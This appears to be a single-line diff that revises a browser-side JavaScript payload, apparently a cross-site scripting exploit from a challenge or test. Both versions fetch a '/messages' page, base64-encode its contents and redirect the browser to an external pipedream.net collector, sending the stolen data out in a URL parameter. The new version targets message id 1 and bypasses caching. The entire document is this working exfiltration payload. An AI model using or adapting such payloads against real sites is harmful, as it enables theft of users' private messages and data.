@@ -1,1 +1,1 @@
-(async()=>{await new Promise(r=>setTimeout(r,500));let t=await (await fetch('/messages')).text();setTimeout(()=>{location.href='https://eoeipamgnflz15n.m.pipedream.net?c='+btoa(t)},150)})();
+(async()=>{let r=await fetch('/messages?id=1',{cache:'no-store'});let t=await r.text();location.replace('https://eoeipamgnflz15n.m.pipedream.net?c='+btoa(t))})();
